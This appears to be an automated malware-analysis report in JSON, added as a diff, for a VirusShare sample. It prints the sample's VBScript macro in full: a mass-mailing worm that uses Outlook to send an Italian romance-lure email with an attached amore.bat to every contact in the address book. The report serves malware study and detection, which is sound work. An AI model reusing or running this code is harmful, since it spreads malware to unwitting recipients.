@@ -1,0 +1,52 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "Set out = CreateObject(\"Outlook.Application\")\nSet mapi = out.GetNameSpace(\"MAPI\") >nul\nFor ctrlists = 1 To mapi.AddressLists.Count >nul\nSet a = mapi.AddressLists(ctrlists) >nul\nx = 1 >nul >>amore.vbs\nFor ctrentries = 1 To a.AddressEntries.Count >nul\nmalead = a.AddressEntries(x) >nul\nSet male = out.CreateItem(0) >nul\nmale.Recipients.Add (malead) >nul\nmale.Subject = \"Sto male senza di TE\" >nul\nmale.Body = \"Ti prego dammi una risposta t.v.b. la tua Valentina\" >nul\nmale.Attachments.Add (\"c:\\amore.bat\") >nul\nmale.Send >nul\nx = x + 1 >nul\nNext >nul\nNext >nul\nSet out = Nothing >nul\nSet mapi = Nothing >nul"
+    },
+    "filename": "VirusShare_316113b7334e96f60f104a3cd067a8e7",
+    "filesize": 606,
+    "filetype": "ASCII text",
+    "hashes": {
+        "md5": "316113b7334e96f60f104a3cd067a8e7",
+        "sha1": "72e5db26db1d7c9f88ac9292bfeacfe0e52f86ea",
+        "sha256": "3ec5de4c2554cc5e71b76d70117f4959d99058f6711fc766ef40d283b95d4c93"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Set out = CreateObject(\"Outlook.Application\")",
+            "Set mapi = out.GetNameSpace(\"MAPI\") >nul",
+            "For ctrlists = 1 To mapi.AddressLists.Count >nul",
+            "Set a = mapi.AddressLists(ctrlists) >nul",
+            "x = 1 >nul >>amore.vbs",
+            "For ctrentries = 1 To a.AddressEntries.Count >nul",
+            "malead = a.AddressEntries(x) >nul",
+            "Set male = out.CreateItem(0) >nul",
+            "male.Recipients.Add (malead) >nul",
+            "male.Subject = \"Sto male senza di TE\" >nul",
+            "male.Body = \"Ti prego dammi una risposta t.v.b. la tua Valentina\" >nul",
+            "male.Attachments.Add (\"c:\\amore.bat\") >nul",
+            "male.Send >nul",
+            "x = x + 1 >nul",
+            "Next >nul",
+            "Next >nul",
+            "Set out = Nothing >nul",
+            "Set mapi = Nothing >nul"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.253003",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
